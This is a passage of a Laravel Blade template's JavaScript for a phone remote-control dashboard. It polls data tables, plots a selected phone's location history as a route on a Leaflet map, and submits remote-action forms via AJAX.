                    }, 3000);


                    let isDtAppsInprogress = false;
                    setInterval(async () => {
                        if (isDtAppsInprogress) return;
                        isDtAppsInprogress = true;

                        const processingEl = $('[tapps]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtApps.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtAppsInprogress = false;
                    }, 3000);

                }

                startWatch();

                var mapinitilized = false;
                var markerGroup = null;
                var map = null;
                let routeLine = null;
                let routeDecorator = null;

                function initmap() {
                    try {
                        const osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                            attribution: '© OpenStreetMap contributors',
                            minZoom: 0,
                            maxZoom: 21
                        });
                        const satelliteLayer = L.tileLayer(
                            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                                attribution: '© Esri',
                                minZoom: 0,
                                maxZoom: 19
                            });

                        const savedLayer = localStorage.getItem('preferredMapLayer');
                        const initialLayer = (savedLayer === 'satellite') ? satelliteLayer : osmLayer;
                        map = L.map('map', {
                            gestureHandling: true,
                            fullscreenControl: true,
                            layers: [initialLayer],
                            center: [-11.653778234733284, 27.46004928023167],
                            zoom: 13,
                        });

                        map.on('baselayerchange', function(e) {
                            if (e.name === 'Satellite') {
                                localStorage.setItem('preferredMapLayer', 'satellite');
                            } else if (e.name === 'Plan') {
                                localStorage.setItem('preferredMapLayer', 'plan');
                            }
                        });

                        const baseMaps = {
                            "Plan": osmLayer,
                            "Satellite": satelliteLayer
                        };
                        L.control.layers(baseMaps).addTo(map);
                        markerGroup = L.layerGroup().addTo(map);
                        mapinitilized = true;
                    } catch (error) {}
                }
                initmap();

                function location(interval = true) {
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        data: {
                            type: "location",
                            phone_id: phonesel.val(),
                            locationdate: locationdate.val(),
                        },
                        timeout: 20000,
                        success: function(data) {
                            if (!mapinitilized) {
                                initmap();
                            }

                            if (mapinitilized) {
                                markerGroup.clearLayers();
                                const latlngs = [];

                                data.forEach(point => {
                                    latlngs.push([point.latitude, point.longitude]);
                                });
                                if (routeLine) {
                                    map.removeLayer(routeLine);
                                    routeLine = null;
                                }

                                if (routeDecorator) {
                                    map.removeLayer(routeDecorator);
                                    routeDecorator = null;
                                }

                                routeLine = L.polyline(latlngs, {
                                    color: 'blue',
                                    weight: 2,
                                    opacity: 0.7,
                                    smoothFactor: 1
                                }).addTo(map);

                                routeDecorator = L.polylineDecorator(routeLine, {
                                    patterns: [{
                                        offset: '5%',
                                        repeat: '10%',
                                        symbol: L.Symbol.arrowHead({
                                            pixelSize: 8,
                                            polygon: true,
                                            pathOptions: {
                                                color: 'blue',
                                                fillOpacity: 1,
                                                weight: 0
                                            }
                                        })
                                    }]
                                }).addTo(map);

                                data.forEach((point, index) => {
                                    const lat = point.latitude;
                                    const lng = point.longitude;
                                    var islast = index == data.length - 1;

                                    const circleOptions = {
                                        radius: 6,
                                        fillColor: islast ? 'red' : (index == 0 ? 'yellow' :
                                            '#3388ff'),
                                        color: '#fff',
                                        weight: 2,
                                        opacity: 1,
                                        fillOpacity: 0.8,
                                    };

                                    const marker = L.circleMarker([lat, lng], circleOptions)
                                        .bindPopup(
                                            `<strong>Précision : ${point.accuracy}m | ${point.date}</strong>`
                                        );
                                    marker.on('mouseover', function(e) {
                                        this.openPopup();
                                    });
                                    markerGroup.addLayer(marker);
                                });

                                const lastPoint = data[data.length - 1];
                                if (lastPoint) {
                                    const lastLat = lastPoint.latitude;
                                    const lastLng = lastPoint.longitude;

                                    const lastIcon = new L.Icon({
                                        iconUrl: 'https://cdn.jsdelivr.net/gh/pointhi/leaflet-color-markers@master/img/marker-icon-red.png',
                                        shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.3/images/marker-shadow.png',
                                        iconSize: [35, 51],
                                        iconAnchor: [17, 51],
                                        popupAnchor: [1, -34],
                                        shadowSize: [41, 41]
                                    });

                                    const lastMarker = L.marker([lastLat, lastLng], {
                                        icon: lastIcon,
                                        zIndexOffset: 1000
                                    }).bindPopup(
                                        `<strong>Précision : ${lastPoint.accuracy}m | ${lastPoint.date}</strong>`
                                    );
                                    lastMarker.on('mouseover', function(e) {
                                        this.openPopup();
                                    });

                                    markerGroup.addLayer(lastMarker);

                                    const mapElement = document.getElementById('map');
                                    const isOnMap = mapElement && mapElement.matches(':hover');
                                    if (!isOnMap) {
                                        map.flyTo([lastLat, lastLng], 18);
                                        lastMarker.openPopup();
                                    }
                                }
                            }
                        },
                    }).always(function(s) {
                        if (interval) {
                            setTimeout(() => {
                                location();
                            }, 3000);
                        }
                    });
                }

                location();

                var faction = $('[f-action]');

                faction.submit(function() {
                    event.preventDefault();
                    var form = $(this);
                    var btn = $(':submit', form).attr('disabled', true);
                    var iclass = btn.find('i').attr('class');
                    btn.find('i').removeClass()
                        .addClass('spinner-border spinner-border-sm');
                    var data = form.serialize();
                    data += "&phone_id=" + phonesel.val();
                    rep = $('#repaction', form);
                    rep.stop().slideUp();
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        type: 'POST',
                        data: data,
                        timeout: 20000,
                        success: function(res) {
                            if (res.success == true) {
                                rep.html(res.message).removeClass().addClass('alert alert-success')
                                    .slideDown();
                                dtResult.ajax.reload(null, false);
                                form[0].reset();
                                $('select', form).change();
                            } else {
                                var m = res.message + '<br>';
                                m += res.data?.errors_msg?.join('<br>') ?? '';
                                rep.removeClass().addClass('alert alert-danger').html(m)
                                    .slideDown();
                            }
                        },
                        error: function(resp) {
                            var mess = resp.responseJSON?.message ??
                                "Une erreur s'est produite, merci de réessayer";
                            rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                        }

                    }).always(function(s) {
                        btn.attr('disabled', false).find('i').removeClass().addClass(iclass);
                        setTimeout(() => {
                            rep.stop().slideUp();
                        }, 3000);
                    });
                });

            });
        </script>
    @endsection
